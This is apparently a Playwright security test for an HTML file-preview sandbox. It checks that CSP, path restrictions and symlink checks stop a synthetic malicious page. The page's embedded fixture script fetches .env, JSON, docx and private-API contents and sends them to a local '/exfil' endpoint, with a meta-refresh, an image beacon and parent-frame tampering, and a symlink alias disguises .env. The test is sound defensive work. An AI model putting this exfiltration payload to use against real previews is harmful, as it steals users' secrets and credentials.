import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import http from 'node:http';
import express from 'express';
import { createServer } from 'vite';
import react from '@vitejs/plugin-react';
import { filePreviewRouter } from '../dist-server/server/file-preview.js';

const { chromium } = await import(process.env.REMOTE_PLAYWRIGHT_MODULE ??
  '../desktop/node_modules/playwright/index.mjs');
const output = path.resolve('output/playwright/preview-security');
const directory = path.join(output, 'files');
await fs.mkdir(directory, { recursive: true });
const secret = 'SYNTHETIC_PREVIEW_SECRET_NEVER_EXPOSE';
const exfiltrations = [], requests = [];
let symlinkSupported = false;
const app = express(), server = http.createServer(app);
app.use((req, _res, next) => { requests.push(req.url); next(); });
app.all('/exfil', (req, res) => { exfiltrations.push(req.url); res.send('unexpected'); });
app.get('/api/private-fixture', (_req, res) => res.json({ secret }));
app.use('/api/file-preview', filePreviewRouter((_req, _res, next) => next()));
const vite = await createServer({ configFile: false, plugins: [react()],
  server: { middlewareMode: true, hmr: false }, appType: 'custom' });
app.get('/', async (_req, res) => res.type('html').send(await vite.transformIndexHtml('/',
  '<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head>' +
  '<body><div id="root"></div><script type="module" src="/scripts/fixtures/live-preview.tsx"></script></body></html>')));
app.use(vite.middlewares);
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const origin = `http://127.0.0.1:${server.address().port}`;
await Promise.all([
  fs.writeFile(path.join(directory, 'live.md'), '# Synthetic preview\n', 'utf8'),
  fs.writeFile(path.join(directory, '.env'), secret, 'utf8'),
  fs.writeFile(path.join(directory, 'status.json'), JSON.stringify({ secret }), 'utf8'),
  fs.writeFile(path.join(directory, 'private.docx'), secret, 'utf8'),
  fs.writeFile(path.join(directory, 'style.css'), 'h1 { color: rgb(12, 100, 44); }', 'utf8'),
  fs.writeFile(path.join(directory, 'safe.js'), "document.documentElement.dataset.scriptLoaded='yes';", 'utf8'),
  fs.writeFile(path.join(directory, 'live.html'), '<!doctype html><html><head>' +
    `<base href="${origin}/"><meta http-equiv="refresh" content="0;url=${origin}/exfil?meta">` +
    '<meta http-equiv="Content-Security-Policy" content="default-src *">' +
    '<link rel="stylesheet" href="./style.css"><script src="./safe.js"></script></head><body>' +
    '<h1>Synthetic protected preview</h1><script>' +
    `for (const target of ['${origin}/api/private-fixture','.env','status.json','private.docx']) {` +
    `fetch(target).then(r=>r.text()).then(text=>fetch('${origin}/exfil?secret='+encodeURIComponent(text))).catch(()=>{});}` +
    `const image=new Image();image.src='${origin}/exfil?image';` +
    `try{parent.document.documentElement.dataset.compromised='yes'}catch{}` +
    "try{localStorage.setItem('compromised','yes')}catch{}" +
    '</script></body></html>', 'utf8')
]);
try {
  await fs.symlink(path.join(directory, '.env'), path.join(directory, 'safe-alias.js'));
  symlinkSupported = true;
} catch (error) {
  if (error.code === 'EEXIST') {
    assert.equal(await fs.realpath(path.join(directory, 'safe-alias.js')), path.join(directory, '.env'));
    symlinkSupported = true;
  } else if (process.platform !== 'win32' || !['EPERM', 'EACCES'].includes(error.code)) throw error;
}
const browser = await chromium.launch({ channel: process.env.REMOTE_BROWSER_CHANNEL ?? 'chrome', headless: true });
try {
  const context = await browser.newContext({ viewport: { width: 1000, height: 800 }, serviceWorkers: 'block' });
  const page = await context.newPage();
  await page.goto(`${origin}/?${new URLSearchParams({ directory })}`);
  await page.getByRole('button', { name: 'live.html', exact: true }).click();
  const frame = page.frameLocator('.file-preview iframe');
  await frame.getByRole('heading', { name: 'Synthetic protected preview', exact: true }).waitFor();
  await page.waitForFunction(() => Boolean(document.querySelector('.file-preview iframe')?.getAttribute('srcdoc')));
  await frame.locator('html[data-script-loaded="yes"]').waitFor();
  assert.equal(await frame.locator('h1').evaluate(node => getComputedStyle(node).color), 'rgb(12, 100, 44)');
  const srcdoc = await page.locator('.file-preview iframe').getAttribute('srcdoc');
  assert(srcdoc.includes("connect-src 'none'"));
  assert.equal(/http-equiv="refresh"/i.test(srcdoc), false);
  assert.equal(await page.evaluate(() => document.documentElement.dataset.compromised), undefined);
  const base = await frame.locator('base').getAttribute('href');
  assert(base.includes('/api/file-preview/render/'));
  for (const relative of ['.env', 'status.json', 'private.docx', 'nested/auth.js', '../status.json']) {
    const response = await context.request.get(new URL(relative, base).href);
    assert([401, 403, 404].includes(response.status()), `${relative}: ${response.status()}`);
    assert.equal((await response.text()).includes(secret), false);
  }
  if (symlinkSupported) {
    const response = await context.request.get(new URL('safe-alias.js', base).href);
    assert.equal(response.status(), 403, 'Static-looking aliases must not expose sensitive real files');
    assert.equal((await response.text()).includes(secret), false);
  }
  await page.waitForTimeout(300);
  assert.deepEqual(exfiltrations, []);
  assert.equal(requests.some(url => url.startsWith('/api/private-fixture')), false);
  await page.screenshot({ path: path.join(output, 'protected-html.png') });
  const result = { localCss: true, localJavaScript: true, privateFilesDenied: true,
    privateApiFetchBlocked: true, parentAndStorageIsolated: true, metaRefreshRemoved: true,
    sensitiveSymlink: symlinkSupported ? 'denied' : 'unavailable-without-Windows-symlink-privilege', exfiltrations };
  await fs.writeFile(path.join(output, 'results.json'), JSON.stringify(result, null, 2), 'utf8');
  console.log(JSON.stringify(result));
  await context.close();
} finally {
  await browser.close();
  await vite.close();
  await new Promise(resolve => server.close(resolve));
}
